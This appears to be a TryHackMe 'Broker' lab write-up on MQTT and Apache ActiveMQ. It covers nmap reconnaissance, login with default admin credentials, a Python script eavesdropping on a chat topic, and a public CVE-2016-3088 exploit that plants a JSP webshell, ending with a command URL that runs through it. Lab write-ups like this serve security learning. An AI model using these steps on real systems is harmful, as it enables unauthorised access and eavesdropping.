[This](https://tryhackme.com/room/broker) machine is about the MQTT protocol. MQTT is a widely used messaging protocol used in IoT devices, used to send any type of data or messages between devices. In the future, I will write a post on MQTT. [This guide by HiveMQ](https://www.hivemq.com/mqtt-essentials/) provides a detailed overview of what MQTT is, how MQTT works, and some cool built in features.

### MQTT Overview

Briefly, MQTT uses a publish-subscribe pattern. There are two types of components in an MQTT system:
* Clients - able to send and receive data.
* Broker - typically one in a network, able to distribute out messages to the appropriate clients

The publish/subscribe (or just pub/sub) pattern is the method by which messages are distributed to the correct clients. Any client can subscribe to any avaliable topic by sending a message to the broker. Any client can publish a message, and must include a topic. This message is sent to the broker, and the broker distributes this message out to every client subscribed to the message's topic.

Now onto the machine.

### Recon

TryHackMe provides some context for this machine:
> Paul and Max found a way to chat at work by using a certain kind of software. They think they outsmarted their boss, but do not seem to know that eavesdropping is quite possible...They better be careful…

We start with a basic nmap scan on the target to see which ports are open, and get a feel for this machine. We scan the top 10,000 ports.

##### Command:
>nmap --top-ports 10000 [target]

```
└─$ nmap --top-ports 10000 10.10.25.215

Nmap scan report for 10.10.25.215
Host is up (0.060s latency).
Not shown: 8337 closed ports
PORT 	STATE SERVICE
22/tcp   open  ssh
1883/tcp open  mqtt
8161/tcp open  patrol-snmp

Nmap done: 1 IP address (1 host up) scanned in 5.51 seconds
```

SSH is open on port 22, but more interestingly, ports 1883 and 8161 are open - 1883 is the default port for insecure MQTT. We now run a more aggressive scan on ports 22, 1883 and 8161.

##### Command:
>nmap -p [open ports] -A -sC -sV -O [target]

The most interesting parts of the output are shown below.

```
└─$ sudo nmap 10.10.25.215 -p 22,1883,8161 -A -sC -O -sV

We see that Apache ActiveMQ is running. This is a broker written in Java, by Apache. Upon visiting the host with a web browser on power 8161, we find an admin login panel. The advanced hacking tool of Google tells us that the default credentials are admin:admin for ActiveMQ.

<br>
And now we are logged in!<br>
<br>
![alt text](/assets/img/tryhackme/broker/activemq.PNG "ActiveMQ homepage")
<br>
We are now inside the admin portal of ActiveMQ. We see that the server is running ActiveMQ version 5.9.0.


![alt text](/assets/img/tryhackme/broker/topics.PNG "topics")

We can also see the list of topics. secret_chat looks interesting…

We now need a MQTT client to subscribe to this topic and receive updates. We use the Python Paho MQTT client, and create a script to subscribe to the secret_chat topic. The [Python Paho Github repo](https://github.com/eclipse/paho.mqtt.python#getting-started) gives a good starting guide to using Paho client.

{% highlight python %}
import paho.mqtt.client as mqtt

# Callback function to print received messages
def on_message(client, userdata, message):
    	print('\nmessage received: ', str(message.payload.decode('utf-8')))
    	print('message topic: ', message.topic)
    	print('message qos: ', message.qos)
    	print('message retain flag: ', message.retain)

# Callback function for successful connection
def on_connect(client, userdata, flags ,rc):
    	print('Connected with result code', str(rc))

    	# Subscribe to secret_chat topic immediately after connection made
    	client.subscribe('secret_chat')

broker = "[target]"

# Create client object
client = mqtt.Client(protocol=mqtt.MQTTv31)

# Attach callback function to client connect and messages
client.on_message = on_message
client.on_connect = on_connect

# Establishing connection to broker
client.connect(broker, 1883)

# Start client loop to see callbacks
client.loop_forever()
{% endhighlight %}

Shown below is the output to this script.

Once subscribed, we see the above messages come through. It appears that these messages loop indefinitely. There is not much interesting information here, but we see that the answer to the TryHackMe question is ‘Hacknet’. Since this MQTT service is not secured, anyone can connect to it. We have shown how easy it is to subscribe to messages.

Let’s try go for root access.
As seen in the webpage, this MQTT system is using ActiveMQ v5.9.0. Luckily for us, this version of ActiveMQ is vulnerable to CVE 2015-1830 - a directory traversal vulnerability which we will use to gain a shell.

We can now load up Metasploit to exploit this.

Metasploit is fired up, we enter the target IP address and we enter the local port to bind to, 54321. We hope to get a meterpreter shell.

Unfortunately this did not seem to work. After hunting around online a bit, I found this repo which exploits a similar vulnerability. https://github.com/Ma1Dong/ActiveMQ_putshell-CVE-2016-3088

This exploit uploads a webshell ro /admin/guo.jsp on the broker’s web interface.







└─$ cat README.md    	 
# ActiveMQ_putshell-CVE-2016-3088-
ActiveMQ_putshell直接获取webshell

#Usage：
python3 ActiveMQ_putshell.py -u url
![image](https://github.com/gsheller/ActiveMQ_putshell-CVE-2016-3088/blob/master/CVE-2016-3088.jpg?raw=true)


└─$ python3 ActiveMQ_putshell.py -u http://[target]

ActiveMQ_put_path：/opt/apache-activemq-5.9.0/webapps/
ActiveMQ_put__txt：http://[target]:8161/fileserver/guo.txt
ActiveMQ_putshell：http://[target]:8161/admin/guo.jsp


Now the webshell is there, we can use it with the url http://10.10.142.157:8161/admin/guo.jsp?pwd=gshell&shell=uname -a
